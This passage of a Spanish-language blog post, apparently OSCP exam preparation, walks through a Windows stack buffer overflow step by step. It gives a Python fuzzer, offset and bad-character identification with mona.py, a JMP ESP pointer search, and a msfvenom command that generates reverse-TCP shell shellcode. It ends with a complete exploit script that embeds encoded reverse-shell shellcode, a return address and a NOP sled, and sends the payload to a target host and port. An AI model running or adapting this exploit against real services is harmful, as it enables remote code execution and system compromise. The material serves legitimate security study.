<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#from pwn import *</span>
<span style=color:#f92672>import</span> socket<span style=color:#f92672>,</span> sys<span style=color:#f92672>,</span> time

<span style=color:#66d9ef>if</span> len(sys<span style=color:#f92672>.</span>argv) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span>:
   print <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>[!] Uso: python &#34;</span> <span style=color:#f92672>+</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&lt;ip-address&gt; &#34;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&lt;remote-port&gt;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
   sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>0</span>)
<span style=color:#75715e># Variables globales</span>
ip_address <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>]
rport <span style=color:#f92672>=</span> int(sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>2</span>])

<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
   contador <span style=color:#f92672>=</span> <span style=color:#ae81ff>100</span>
   <span style=color:#75715e>#p1 = log.progress(&#34;Data&#34;) Log de datos en pwntools</span>
   <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
      <span style=color:#75715e>#p1.status(f&#34;Enviando {contador} bytes.&#34;) Log de datos en pwntools</span>
      print <span style=color:#e6db74>&#34;Enviando </span><span style=color:#e6db74>%s</span><span style=color:#e6db74> bytes.&#34;</span> <span style=color:#f92672>%</span> contador
      buffer <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>*</span> contador
      <span style=color:#66d9ef>try</span>:
         s <span style=color:#f92672>=</span> socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_STREAM)
         s<span style=color:#f92672>.</span>connect((ip_address, rport))

         data <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)
         <span style=color:#75715e>#s.send(&#34;USER srrequiem\r\n&#34;)</span>
         <span style=color:#75715e>#data = s.recv(1024)</span>
         s<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> buffer)
         data <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)
         contador <span style=color:#f92672>+=</span> <span style=color:#ae81ff>100</span>
         <span style=color:#75715e>#En algunas ocasiones no suele romperse la conexion lo que evita entrar</span>
         <span style=color:#75715e>#al codigo de la excepcion por lo que se puede considerar meter un sleep</span>
         <span style=color:#75715e>#para visualizar en que valor de la iteracion se pausa la ejecucion del binario</span>
         time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>1</span>)
      <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> ex:
         print <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>[!] Ha habido un error de conexion</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
         print ex
         sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>1</span>)
</code></pre></div><p>Por medio del script se puede buscar el cambio del <code>EIP</code> de manera automática.</p>
<p><img loading=lazy src=/images/posts/bof-oscp/bof_4.png alt="Cambio de valor de EIP">
</p>
<p><strong>Generacion de patrón</strong></p>
<p><code>msf-pattern_create -l &lt;longitud de bytes></code></p>
<p><code>!mona pattern_create &lt;longitud de bytes></code></p>
<p>Después de provocar el fallo con el patrón, la dirección <code>EIP</code> se sustituiría con un valor del segmento de nuestro patrón. El valor que contenga <code>EIP</code> ahora lo identificaremos para saber el offset específico.</p>
<p><img loading=lazy src=/images/posts/bof-oscp/bof_5.png alt="EIP con valor de patrón">
</p>
<p><strong>Identificación offset</strong></p>
<p><code>msf-pattern_create -l &lt;EIP></code></p>
<p><code>!mona pattern_offset &lt;EIP></code></p>
<p><img loading=lazy src=/images/posts/bof-oscp/bof_6.png alt="EIP con valor de patrón">
</p>
<ol>
<li>Offset.</li>
<li>EIP.</li>
</ol>
<p><em>Nota: Siempre corroborar con un payload propio modificando después del offset un valor que se identifique facilmente. Ejemplo: 1052 &lsquo;A&rsquo; y 4 &lsquo;B&rsquo; en este caso el <code>EIP</code> valdría <code>42424242</code></em></p>
<h2 id=identificar-bad-chars>Identificar Bad Chars<a hidden class=anchor aria-hidden=true href=#identificar-bad-chars>#</a></h2>
<h3 id=manual>Manual<a hidden class=anchor aria-hidden=true href=#manual>#</a></h3>
<p>Si bien es bueno saber el proceso que se realiza, es una tarea que consume mucho tiempo y que existe una gran posibilidad de cometer errores al realizarlo ya que es muy fácil perder algún byte de vista muy fácil.</p>
<p>El proceso se centra en enviar el payload con los badchars y directamente seguir los caracteres ASCII obtenidos del <code>ESP</code> y buscar cuales son los que no se visualizan correctamente, identificandolos así uno a uno. Se puede generar la colección de bytes con <code>mona.py</code> con el comando <code>!mona bytearray</code> dentro de Immunity Debugger para tener la colección y poder incorporarla al payload.</p>
<h4 id=colección-plana>Colección plana<a hidden class=anchor aria-hidden=true href=#colección-plana>#</a></h4>
<p><code>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</code></p>
<h4 id=colección-en-arreglo>Colección en arreglo<a hidden class=anchor aria-hidden=true href=#colección-en-arreglo>#</a></h4>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>badchars <span style=color:#f92672>=</span> (
  <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10</span><span style=color:#e6db74>&#34;</span>
  <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span style=color:#e6db74>&#34;</span>
  <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30</span><span style=color:#e6db74>&#34;</span>
  <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span style=color:#e6db74>&#34;</span>
  <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50</span><span style=color:#e6db74>&#34;</span>
  <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60</span><span style=color:#e6db74>&#34;</span>
  <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70</span><span style=color:#e6db74>&#34;</span>
  <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80</span><span style=color:#e6db74>&#34;</span>
  <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90</span><span style=color:#e6db74>&#34;</span>
  <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span style=color:#e6db74>&#34;</span>
  <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0</span><span style=color:#e6db74>&#34;</span>
  <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0</span><span style=color:#e6db74>&#34;</span>
  <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0</span><span style=color:#e6db74>&#34;</span>
  <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0</span><span style=color:#e6db74>&#34;</span>
  <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0</span><span style=color:#e6db74>&#34;</span>
  <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span style=color:#e6db74>&#34;</span>
)
</code></pre></div><p>Después de enviar el payload con los badchars y lograr la pausa del programa podemos seguir el contenido del <code>ESP</code> dándo click derecho en el registro y seleccionando la opción <code>Follow in Dump</code>, de la sección ubicada en la esquina inferior izquierda se nos desplegará el contenido del registro para poder identificar los badchars manualmente.</p>
<p><img loading=lazy src=/images/posts/bof-oscp/bof_11.png alt="Follow in Dump Immunity Debugger">
</p>
<p>Se anexan ejemplos de cómo se verían los badchars en el dump de hexadecimal (sección inferior izquierda de Immunity Debugger).</p>
<p><img loading=lazy src=/images/posts/bof-oscp/bof_12.png alt="Ejemplo Badchar 1">
</p>
<p><img loading=lazy src=/images/posts/bof-oscp/bof_13.png alt="Ejemplo Badchar 2">
</p>
<h3 id=automático>Automático<a hidden class=anchor aria-hidden=true href=#automático>#</a></h3>
<p>El proceso se puede optimizar usando <code>mona.py</code> de manera iterativa, con los siguientes comandos <code>mona.py</code> nos devolverá los badchars identificados.</p>
<ol>
<li><code>!mona bytearray</code>: Generará archivos con arreglo de badchars.</li>
<li><code>!mona compare -f &lt;ubicacion de byte array .bin> -a &lt;dirección de ESP></code>: Comparará los badchars contenidos respecto al payload ubicado en el <code>ESP</code> (recordando que payload = filler + eip + badchars).</li>
<li><code>!mona bytearray -cpb '\x00'</code>: Generará archivos con arreglo de badchars exceptuando los indicados.</li>
<li>Repetir proceso hasta encontrar todos los badchars.</li>
</ol>
<h2 id=búsqueda-de-dirección>Búsqueda de dirección<a hidden class=anchor aria-hidden=true href=#búsqueda-de-dirección>#</a></h2>
<p>Aquí se realiza la búsqueda de la instrucción <code>JMP ESP</code> (valores hexadecimales <code>\xff\xe4</code>) en las dlls del binario, siempre tratando de identificar aquellas que no cuenten con protecciones (todas la banderas dadas por <code>mona.py</code> en <code>False</code>).</p>
<p><em>Nota: se puede hacer uso de <code>msf-nasm_shell</code> para ver el valor de los <code>OP codes</code> (en este caso <code>jmp ESP</code>) en caso que se requiera.</em></p>
<p><img loading=lazy src=/images/posts/bof-oscp/bof_7.png alt="OP code jmp ESP">
</p>
<p><strong>Comando de mona.py</strong></p>
<p><code>!mona modules</code></p>
<p><strong>Ejemplo</strong></p>
<p><img loading=lazy src=/images/posts/bof-oscp/bof_8.png alt="Mona modules">
</p>
<h3 id=búsqueda-de-apuntador-en-dll>Búsqueda de apuntador en dll<a hidden class=anchor aria-hidden=true href=#búsqueda-de-apuntador-en-dll>#</a></h3>
<p>Aquí se realiza una búsqueda de los apuntadores contenidos en la dll identificada con el valor de la instrucción <code>\xff\xe4</code>.</p>
<p><strong>Comando de mona.py</strong></p>
<p><code>!mona find -s "\xff\xe4" -m &lt;nombre de dll></code></p>
<p>Se desplegará una lista de direcciones de memoria que se pudieran utilizar, sin antes considerar 2 cosas. La descripción de la tabla contenerá direcciones con permisos de lectura y ejecución (<code>PAGE_EXECUTE_READ</code>); y de escritura solamente (<code>PAGE_READ_ONLY</code>), <strong>hay que tomar en cuenta sólo aquellas que cuenten con ejecución</strong> (<code>PAGE_EXECUTE_READ</code>). Y también desplegará las protecciones con las que cuenta la dll, tomar de nuevo en cuenta aquellas que tengan todo deshabilitado (<code>False</code>).</p>
<p><img loading=lazy src=/images/posts/bof-oscp/bof_9.png alt="JMP ESP en dll">
</p>
<ol>
<li>Comando.</li>
<li>Direcciones útiles para usar en EIP (buscar aquellas que en el valor de la dirección no contenga ningún badchar).</li>
<li>Permisos.</li>
<li>Protecciones.</li>
</ol>
<h2 id=generación-de-shellcode>Generación de shellcode<a hidden class=anchor aria-hidden=true href=#generación-de-shellcode>#</a></h2>
<p>Aquí se generará el shellcode a utilizar después de la sustitución del valor que se asigne a la <code>EIP</code>.</p>
<p><strong>Comando de ejemplo</strong></p>
<p><code>msfvenom -a x86 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai LHOST=&lt;ip> LPORT=&lt;puerto> -b '\x00' EXITFUNC=thread -i 3 -f python > scode.txt</code></p>
<p>Tener en consideración:</p>
<ul>
<li>Sistema operativo.</li>
<li>Arquitectura.</li>
<li>Payload.</li>
<li>Formato (python, c, exe, etc).</li>
<li>Variables de escucha y/o comando a ejecutar.</li>
<li>Encoding (extra: <code>-i 3</code> para número de iteraciones para encodear).</li>
<li>BadChars.</li>
<li>Función de salida (para evitar que el proceso termine usar <code>seh</code> o <code>thread</code>).</li>
</ul>
<p><em><strong>Si se da el caso que los badchars sean bastantes tal que la generación del shellcode no se realice satisfactoriamente, considerar quitar el encoder <code>x86/shikata_ga_nai</code> para que automáticamente se utilicé el encoder que cumpla con los requisitos (colección de badchars a evitar).</strong></em></p>
<h2 id=generación-de-exploit>Generación de exploit<a hidden class=anchor aria-hidden=true href=#generación-de-exploit>#</a></h2>
<h3 id=ejemplo-de-exploit-final>Ejemplo de exploit final<a hidden class=anchor aria-hidden=true href=#ejemplo-de-exploit-final>#</a></h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> struct <span style=color:#f92672>import</span> pack
<span style=color:#f92672>import</span> socket<span style=color:#f92672>,</span> sys

<span style=color:#66d9ef>if</span> len(sys<span style=color:#f92672>.</span>argv) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span>:
    print <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74> [!] Uso: python &#34;</span> <span style=color:#f92672>+</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&lt;ip-address&gt;&#34;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&lt;remote-port&gt; </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>
    sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>0</span>)

ip_address <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>]
rport <span style=color:#f92672>=</span> int(sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>2</span>])
shellcode <span style=color:#f92672>=</span>  <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xb8\x36\xda\x75\x0f\xda\xd5\xd9\x74\x24\xf4\x5b\x2b</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xc9\xb1\x5f\x83\xc3\x04\x31\x43\x10\x03\x43\x10\xd4</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x2f\xce\x68\xaf\x10\x8c\xac\x01\x49\x9b\x76\x69\x30</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x55\xbe\x20\x9d\xa4\x1a\x57\x9d\x2d\x66\x54\xfb\xa0</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x75\xc8\xf6\x32\x68\x08\x59\x9b\x32\x1d\xb8\x35\x8a</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x2e\x1c\xec\x8c\x49\xea\xa6\xae\xc5\xfb\xef\x11\xbd</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xa9\x1f\x9b\xf3\x51\xc8\x4a\x27\x35\xa2\xd1\x60\x03</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x55\x72\xf5\xcc\x0b\xd2\x2a\xda\x41\x4d\x5f\x4f\xb4</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x2f\xbb\xc6\x88\x45\x5f\x3e\x11\x08\x86\x09\x5d\xe7</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xf8\x11\x49\x5c\x12\xdc\x8e\x66\xa0\x1e\x1c\x10\x0a</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xf8\xa7\xac\x6b\x8d\xd4\x2a\xaa\xe6\x5e\x9d\xbe\x04</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x42\x52\xe0\x71\x86\xc5\xa6\xa2\xff\xdf\xcb\x75\x28</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x2f\x5b\x05\x57\x39\x45\xd2\x7e\x05\xd6\x91\xfd\x46</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x2c\x31\x66\xea\xbe\x3c\xc8\x10\x96\xf6\xcc\x31\xbc</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x56\x43\x24\x1f\x86\xed\xf2\x59\xa2\x38\x9c\x4f\xa1</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xc6\x58\x71\xb7\x81\x9d\xe3\x25\xb7\xc7\xf4\x5c\xa3</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x01\xd4\x5e\xf2\x1d\x92\x57\x08\x65\xd9\x62\xdf\xb4</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xdf\xaa\xb8\x6a\x61\x82\x87\xfa\x27\x0c\xe9\x49\x46</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xea\x50\x51\xb6\x6b\xc9\xbc\xe4\x95\xff\xf8\x36\x94</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x3b\xbd\x24\xd9\x9c\xb5\x1e\x77\xcb\x31\x84\x2a\xe3</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xca\xac\xd7\x8c\x12\xed\xa0\x53\xfa\xbc\x94\xf3\x9b</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xe5\x8a\xac\xf3\x48\x1a\x39\x2e\x63\x5a\x68\xe9\x85</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x93\xde\x3a\x22\x77\x2a\xac\xa1\xfa\x96\x7f\x9f\x95</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x6f\xa3\xe4\x13\x41\x9a\xe8\xf6\x97\x6b\x2d\x31\x68</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x9c\xb1\x2f\xab\xa3\xf5\x56\xe9\xf5\xa3\x21\xe9\x9c</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x19\xaf\x10\x57\xfb\x80\x0e\x73\x48\x84\xb1\xb0\xb0</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x83\x67\x88\xb5\x1d\x0e\x73\xeb\xa1\xd1\xdc\xa2\xe9</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x76\xcc\xd0\x27\x6b\xed\x5d\xfc\x02\xcb\x8f\xff\xc3</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xb2\x8f\xf3\xee\x96\x9a\xec\xb1\x73\x55\x47\x82\x70</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x10\x32\x53\xbb\xfa\x83\x38\x3b\xb0\xea\xd1\xe4\x6e</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x2f\x7d\x23\xc5\xd9\x5d\xfb\x48\x06\x3d\x4f\x33\xfe</span><span style=color:#e6db74>&#34;</span>
shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x03\x9c</span><span style=color:#e6db74>&#34;</span>

<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
    <span style=color:#75715e>#buffer = &#34;A&#34; * 1052 + pack(&#34;&lt;L&#34;, 0x68a98a7b) + &#34;\x83\xEC\x10&#34; + shellcode</span>
    buffer <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>1052</span> <span style=color:#f92672>+</span> pack(<span style=color:#e6db74>&#34;&lt;L&#34;</span>, <span style=color:#ae81ff>0x68a98a7b</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x90</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>16</span> <span style=color:#f92672>+</span> shellcode
    <span style=color:#66d9ef>try</span>:
        s <span style=color:#f92672>=</span> socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_STREAM)
        s<span style=color:#f92672>.</span>connect((ip_address, rport))
        s<span style=color:#f92672>.</span>send(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> buffer)
    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> ex:
        print <span style=color:#e6db74>&#34;[!] Ha habido un error de conexion&#34;</span>
        print ex
        sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>1</span>)
</code></pre></div><p><strong>Consideraciones</strong></p>
<p>Si bien se pueden utilizar algunos &ldquo;trucos&rdquo; para caer en la dirección donde se encuentra el shellcode como lo son los <code>NOPs (\x90)</code> se puede ocupar un desplazamiento de pila para restar posiciones, y jugar un poco con los valores. Dentro de <code>msf-nasm_shell</code> se puede invocar la instrucción <code>sub esp, &lt;valor en hexadecimal></code>. Ejemplo:</p>
<p><img loading=lazy src=/images/posts/bof-oscp/bof_10.png alt="OP code de sub">
</p>
<p>En este caso se obtendría el valor <code>83EC10</code> como código de operación para el desplazamiento de 10 unidades. quedando la línea de construcción del payload como: <code>buffer = "A" * 1052 + pack("&lt;L", 0x68a98a7b) + "\x83\xEC\x10" + shellcode</code> en lugar de los <code>NOPs</code>.</p>
</div>
<footer class=post-footer>
<ul class=post-tags>
<li><a href=https://rzul.me/tags/bof-windows/>BoF - Windows</a></li>
</ul>
<nav class=paginav>
<a class=prev href=https://rzul.me/posts/htb-active/>
<span class=title>« Página anterior</span>
<br>
<span>Hack The Box - Active</span>
</a>
<a class=next href=https://rzul.me/posts/echoctf_smithers/>
<span class=title>Página siguiente »</span>
<br>
<span>echoCTF - Smithers</span>
</a>
</nav>
<div class=share-buttons>
